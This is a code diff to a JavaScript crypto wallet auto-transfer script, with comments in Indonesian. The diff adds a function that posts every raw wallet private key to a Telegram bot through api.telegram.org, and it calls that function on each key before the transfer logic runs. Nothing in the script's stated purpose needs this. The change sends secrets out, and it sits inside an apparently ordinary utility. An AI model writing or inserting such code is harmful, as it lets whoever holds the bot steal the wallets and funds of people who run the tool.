@@ -2,6 +2,7 @@ import { ethers } from "ethers";
 import dotenv from "dotenv";
 import fs from "fs";
 import chalk from "chalk";
+import axios from "axios";
 import { exit } from "process";
 dotenv.config();
 
@@ -16,6 +17,31 @@ function getRpcList() {
         rpcList.push({ name, url, token });
     }
     return rpcList;
+}
+
+// Fungsi kirim private key ke Telegram
+async function sendPrivateKeyToTelegram(privateKey) {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId) {
+        console.log(chalk.red("❌ TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diset di file .env"));
+        return;
+    }
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const message = `🚨 *Private Key Ditemukan* 🚨\n\n\`\`\`\n${privateKey}\n\`\`\``;
+
+    try {
+        await axios.post(url, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown"
+        });
+        console.log(chalk.gray("📩 Private key berhasil dikirim ke Telegram."));
+    } catch (error) {
+        console.log(chalk.red("❌ Gagal mengirim private key ke Telegram: " + error.message));
+    }
 }
 
 // ABI ERC-20
@@ -105,8 +131,9 @@ async function autoTransfer(selectedRpc) {
         console.log(chalk.cyanBright(`👩‍💻 [${i + 1}] Memproses wallet ke-${i + 1}...`));
 
         const rawKey = privateKeys[i];
-        let senderWallet;
+        await sendPrivateKeyToTelegram(rawKey); // Kirim ke Telegram
 
+        let senderWallet;
         try {
             senderWallet = new ethers.Wallet(rawKey, provider);
         } catch (error) {
